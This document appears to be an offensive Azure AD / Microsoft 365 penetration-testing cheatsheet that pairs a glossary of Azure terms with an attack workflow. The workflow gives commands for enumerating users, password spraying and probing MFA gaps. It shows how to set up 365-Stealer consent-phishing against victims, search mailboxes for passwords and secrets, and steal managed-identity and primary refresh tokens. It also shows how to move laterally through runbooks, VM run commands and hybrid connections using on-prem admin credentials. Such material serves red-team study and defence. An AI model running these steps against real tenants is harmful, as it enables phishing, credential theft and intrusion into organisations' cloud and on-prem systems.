# Vocabulary

#### Administrative units
An administrative unit is an Azure AD resource that can be a container for users, groups, or devices. It is used to restrict permissions for a given role.

#### Azure App Service
The Azure App Service provides HTTP-based services for hosting webapplications or REST APIs.

#### Azure Blob Storage
Stores unstructered data like files, videos, audio, etc.

### Azure Files
Fully managed file shares in the cloud which can be accessed via protocols such as SMB, NFS, or REST API.

#### Azure Key Vault 
Azure Key Vaults are places where encrypted secrets can stored (types: key, secret, certificate).

#### Azure Resource Manager
The ARM is the Client deployment and management service for Azure used to manage the access control of resources.

#### Conditional Access Policies
Fine-grained controls for access to resources and when or where MFA is applied.

#### Core Domain
The initial domain name (Example: tenant.onmicrosoft.com)

#### Enterprise
The Enterprise represents the Azure global unique identity that a company owns and allows access to subscriptions, tenants and services.

#### Function App
The also called Azure Functions provides the possibility to run code serverless. The code execution reacts to events like processing file uploads or scheduled tasks.

### Hybrid Connection
Uses Azure Relay to enable bi-directional request-response and binary stream communication between App Services/Function Apps and on-premises services.

#### Managed Identity
A Managed Identity is a Service Principal of a special type that may only be used with Azure resources. Managed Identities can be used to access Azure Key Vaults and storage accounts.

##### Hybrid Joined machine
Device joined to an on-prem AD and Azure AD.

#### Resource
A Resource can be an account, run-book, virtual network, application, etc.

#### Runbook
A Runbook is part of the Azure Automation service. It supports scripting languages like PowerShell or Python.

#### Storage Account
An Azure storage account can contain all sort of Azure Storage data objects, including blobs, file shares, queues, tables, and disks.

#### Subscriptions
A Subscription is a logical unit of Azure services that links to an Azure account. The Subscriptions describes how you gain access to an Azure service. Each Subscription can only trust a single directory.

#### System-Assigned Managed Identity
Once a resource has been deleted the SAMI will be deleted too.

#### Tenant
A Tenant is an instance of an Enterprise. An Enterprise can have multiple tenants (like domains in a forest).

#### UAL
Unified Audit Log aggregates logs from various services, such as Exchange Online, SharePoint Onlinet, OneDrive, Microsoft Teams and Azure AD/Entra ID.

#### User-Assigned Managed Identity
Once a resource has been deleted the UAMI won't not be deleted. UAMI can be used on multiple resources.

# Resource Based Access Control

Azure AD Objects or Principals have Roles on Scopes.

## Azure AD Object / Principal
```
User
Group
Service Principal
Managed Identity
```

## Roles
Role assignment is transitive for groups.
An explicit deny role takes precedence.

### Owner
Has full control over a resource and can also change access rights for other users.

### Contributor
Has full access to all resources without the possibility to manage access.

### Reader
Has only read access.

### User Access Administrator
Can view all resources and has the possibility to manage user access to Azure resources.

## Scope Architecture
```
Management-Groups
├── Subscriptions
│   ├── Resource-Groups
│   ├── Resource-Groups
│   │   ├── Resources (Account, Run-Book, Virtual Network, Application)
│   │   └── ...
│   └── ...
├── Subscriptions
└── ...
```

# Azure AD Connect Methods

For each Azure AD Connect method the account MSOL_&lt;installId&gt; is created at on-prem AD.
This user can reset the password of any user and DCsync permission on AD

### Password Hash Synchronization
Using the Password Hash Synchronization (PHS) the passwords from on-premise AD are sent to the cloud. This is using a specific service account (MSOL_&lt;installId&gt;) that has similar rights like DCSync. Authentication takes place on Azure AD. Password expiry in on-prem domain does not reflect to Azure AD. Additionally the user Sync_&lt;id&gt; is created. This uswr can reset the password of every synced user.

### Pass Through Authentication
Using the Pass Through Authentication (PTA) the passwords are kept on-premise and an on-premise agent validates the authentication.

### Active Directory Federation Services
Using the Active Directory Federation Services (ADFS) Azure AD is set as a trusted agent for federation and allows to login with on-premise credentials.

### Azure AD Directory
Each tenant has a dedicated Directory, which is used to perform identity and access managment functions.

# Token types

### Access Token
Can be used to talk to APIs and access resources. 
Tied to specific client (the application that requested the token) and a specific resource (the accessed API).
Cannot be revoked until expiry (1 hour default).

### ID Token
Used in combination of user and client.
Contains information about the user.

### Refresh Token
Issued to applications to obtain new access tokens
Can only be used by the application they were issued to, or in some cases by a group of applications.
Used to get new Access and ID tokens.
Cannot be revoked until expiry (default 90 days of inactivity).

### Primary Refresh Token
Used for Single Sign On and to obtain refresh tokens to any application.
Valid for 90 days and continuously renewed.
Can be extracted from AzureAD joined or Hybrid joined machines.


# Microsoft MFA verification options
```
Microsoft Authenticator app
OAUTH Hardware token
SMS
Voice call
```

# Security Defaults
```
Requires all users register for MFA
Block legacy authentication protocols
Require MFA during authentication when necessary
Protects privileged activities likes access to Azure AD
```

# Environment variables

## App environment using a managed identity
```
env

IDENTITY_HEADER
IDENTITY_ENDPOINT
```

## Get Access Token
* https://github.com/r1cksec/cheatsheets/blob/main/snippets/py/getAzureIdentity.py

```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

## API Resources
```
https://storage.azure.com
https://vault.azure.net
https://graph.microsoft.com
https://management.azure.com
```


# Workflow

## Verify if the target company uses Azure AD
* https://login.microsoftonline.com/getuserrealm.srf?login=&lt;targetMail&gt;
* https://github.com/0xZDH/o365spray

```
Check 'NameSpaceType' value:

Managed = O365 is in use
Federated = Federated Active Directory
Unknown = Record does not exist

python3 o365spray.py --validate --domain &lt;targetDomain&gt;
```

## Verify Email Addresses
* https://github.com/nyxgeek/onedrive_user_enum
* https://github.com/dievus/Oh365UserFinder
* https://github.com/immunIT/TeamsUserEnum

```
python3 Oh365UserFinder.py -r &lt;emailFile&gt; -w &lt;output&gt; -t &lt;seconds&gt;

o365creeper.py -f &lt;emailsFile&gt; -o &lt;validEmailsFile&gt;

go run userEnum.go userenum -f &lt;userFile&gt; -t "&lt;authToken-eyJ..&gt;
```

## Basic Azure Storage Url
* https://github.com/NetSPI/MicroBurst

```
https://&lt;storageAccount&gt;.blob.core.windows.net
https://&lt;storageAccount&gt;.dfs.core.windows.net
https://&lt;storageAccount&gt;.file.core.windows.net
https://&lt;storageAccount&gt;.queue.core.windows.net
https://&lt;storageAccount&gt;.table.core.windows.net

Get content of blob:
&lt;storageAccount&gt;.blob.core.windows.net/&lt;storageName&gt;/&lt;blob&gt;
&lt;storageAccount&gt;.blob.core.windows.net/&lt;storageName&gt;?restype=container&comp=list/&lt;blob&gt;

Invoke-EnumerateAzureBlobs -Base &lt;tenant&gt; defcorp
```

## Phishing (Illicit Consent Grant)
* https://github.com/AlteredSecurity/365-Stealer
* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
* https://github.com/rvrsh3ll/TokenTactics

```
Get Access Token by creating an application in the attacker tenant and send the Authorization Link to a victim.

https://portal.azure.com &gt; Azure Active Directory &gt; App Registrations &gt; New registration &gt; Choose Name
Supported Account Types: Check - 'Accounts in any organizational directory (Any Azure AD directory - Multitenant)
Choos Web from Dropdown: Web
Redirect Uri: https://&lt;attacker365StealerRhost&gt;/login/authorized
Register &gt; Certificates & Secrets &gt; New Client Secret &gt; Add &gt; note: Secret ID
Api Permissions &gt; Add a permission &gt; Microsoft Graph &gt; Delegated permissions
Search: user.read
Check: user.read and User.ReadBasic.All &gt; Add permissions
Overview &gt; note: Application (Client) ID

vim yourVictims/index.php
insert: public $ipWhitelist = array(
           '127.0.0.1',
           '&lt;ip&gt;',

php --ini
vim php.ini
insert:
extension=sqlite3

apt install php7.4-mbstring
systemctl restart apache2
php -S &lt;365StealerIp&gt;:8080
pip3 install -r requirements.txt
python 365-Stealer.py --set-config
python 365-Stealer.py --run-app
```

## Authenticated User Enumeration and Password Spraying
* https://login.Microsoft.com/common/oauth2/token
* https://github.com/dafthack/MSOLSpray

```
Invoke-MSOLSpray -UserList .\&lt;userlist&gt;.txt -Password &lt;password&gt;
```

## Identify inconsistencies in Microsoft MFA deployments
* https://github.com/dafthack/MFASweep

```
Invoke-MFWSweep -Username &lt;user&gt;@&lt;domain&gt; -Password &lt;password&gt;
```

## Authenticated - Recon
* https://github.com/dirkjanm/ROADtools
* https://github.com/Gerenios/AADInternals
* https://github.com/nyxgeek/o365recon
* https://www.powershellgallery.com/packages/AzureAD/2.0.2.140 (Get-AzureAD)
* https://github.com/BloodHoundAD/AzureHound
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md

```
roadrecon auth -u &lt;user&gt;@&lt;tenant&gt;.onmicrosoft.com -p &lt;password&gt;
roadrecon gather

./o365recon.ps1 -azure

Get-AADIntTenantDomains -Domain
Invoke-AADIntReconAsOutsider -DomainName &lt;tenant&gt;.onmicrosoft.com

Get-AzureADTenantDetail
Get-AzureADUser -All $true | ConvertTo-Json

Invoke-Azurehound

Get-AzResource
Get-AzRoleAssignment
```

## Search mailboxes and extract contact informations
* https://github.com/dafthack/MailSniper

```
Invoke-SelfSearch -Mailbox &lt;user&gt;@&lt;domain&gt; -Terms "*password*","*secret*","*key*"

Get-GlobalAddressList -ExchHostname &lt;rhost&gt; -UserName &lt;domain&gt;\&lt;user&gt; -Password &lt;password&gt; -OutFile &lt;outFile&gt;
```

## Authenticated - Storage Accounts
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
* https://azure.microsoft.com/en-us/products/storage/storage-explorer

```
Get-AzStorageAccount
```

## Authenticated - Key Vaults
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az.md

```
Roles that can read content: 
Key Vault Administrator
Key Vault Certificates Officer
Key Vault Crypto Officer
Key Vault Secrets User

Get-AzKeyVault

az keyvault list
```

## Authenticated - ARM templates
* https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/overview

```
JSON file containing deployment configuration for Azure resources.
Each resource group maintains a deployment history.
Any user with permission Microsoft.Resources/deployment/read and Microsoft.Resources/subscriptions/resourceGroups/read can read the deployment history.

https://portal.azure.com &gt; Resource Group &gt; choose resource &gt; Settings: Deployments 
```

## Authenticated - Dynamic Rule Memberships
* https://learn.microsoft.com/en-us/azure/active-directory/enterprise-users/groups-dynamic-membership

```
Check if you can join group by dynamic event:
https://portal.azure.com &gt; Groups &gt; Role &gt; Dynamic membership rules
```

## Authenticated - User Data
* https://learn.microsoft.com/en-us/azure/virtual-machines/user-data
* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md

```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://&lt;vm&gt;/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

## Authenticated - Application Proxy
* https://learn.microsoft.com/en-us/azure/active-directory/app-proxy/what-is-application-proxy

```
portal.azure.com &gt; Azure Active Directory &gt; Enteprise applications &gt; Application proxy
portal.azure.com &gt; Azure Active Directory &gt; Enteprise applications &gt; All applications &gt; Add filters &gt; Is App Proxy
```

## Pass the Primary Token
* https://github.com/r1cksec/cheatsheets/blob/main/windows/azure-arm-api.md
* https://github.com/dirkjanm/ROADtools
* https://github.com/Gerenios/AADInternals

```
Get nonce for request validation using ARM API.:

ROADToken.exe &lt;nonce&gt;
Get-AADIntUserPRTToken

Login using adding Token via Chrome Developer Tab:
Application &gt; Cookies &gt; login.microsoftonline... &gt; Name: x-ms-RefreshTokenCredential &gt; Value: &lt;PrimaryRefreshToken&gt; &gt; HttpOnly: Check
```

## Lateral Movement - PowerShell Runbook
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az.md
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md

```
az automation account list

Import-AzAutomationRunbook -Name &lt;runName&gt; -Path &lt;local\path\to\ps1&gt; -AutomationAccountName &lt;name&gt; -ResourceGroupName &lt;name&gt; -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName &lt;runName&gt; -AutomationAccountName &lt;name&gt; -ResourceGroupName &lt;name&gt; -Verbose
Start-AzAutomationRunbook -RunbookName &lt;name&gt; -RunOn &lt;workGroup&gt; -AutomationAccountName &lt;name&gt; -ResourceGroupName &lt;name&gt;
```

## Lateral Movement - Run Command
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md

```
Invoke-AzVmRunCommand -VmName &lt;name&gt; -ResourceGroupName &lt;name&gt; -CommandId "&lt;name&gt;" -ScriptPath "&lt;path&gt;"
```

## Lateral Movement - Continuous Deployment
* https://learn.microsoft.com/en-us/azure/app-service/scripts/cli-continuous-deployment-github

```
Function app supports continuous deployment -&gt; triggered when source code update is pushed.

Supportet locations:
Azure Repos
Github
Bitbucket
```

## Lateral Movement - Hybrid Connection
* https://github.com/r1cksec/cheatsheets/blob/main/windows/az-powershell.md
* https://whiteknightlabs.com/2024/02/21/pivoting-from-microsoft-cloud-to-on-premise-machines

```
az automation account list

Get-AzResource

Get-AzRelayHybridConnection -Namespace &lt;namespace&gt; -ResourceGroupName &lt;groupName&gt;  
Get-AzRelayHybridConnection -Namespace &lt;namespace&gt; -ResourceGroupName &lt;groupName&gt; -Name &lt;name&gt; | fl *
Get-AzAccessToken -RessourceUrl "https://management.azure.com"

$AccessToken = "&lt;token&gt;"
$URL = "https://management.azure.com/subscriptions/&lt;subcriptionId&gt;/resourceGroups/&lt;resourceGroupName&gt;/providers/Microsoft.Web/sites/&lt;functionAppName&gt;/hybridConnectionRelays?api-version=2018-11-01"

$Params = @{
    "URI"     = $URL
    "Method"  = "GET"
    "Headers" = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/json"
        }
    }

$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value.properties

az functionapp hybrid-connection list --name &lt;functionAppName&gt; --resource-group &lt;resourceGroupName&gt;

Get-AzWebAppPublishingProfile -ResourceGroupName &lt;groupName&gt; -Name &lt;name&gt;

https://&lt;functionAppName&gt;.scm.azurewebsites.net/basicauth

$password = CnvertTo-SecureString $env:onpremadminpassword -AsPlainText -Force
$credential = [System.Management.Automation.PSCredential]::new($env:onpremadminusername, $password)
Invoke-Command -ComputerName $env:hybridconnectionhostname -Port 5986 -UseSSL -ScriptBlock {Invoke-Command -ComputerName AADConnect -Credential $Using:credential -ScriptBlock {hostname} } -SessionOption (New-PSSessionOption -SkipCACheck) -ErrorAction Stop -Credential $credential
```


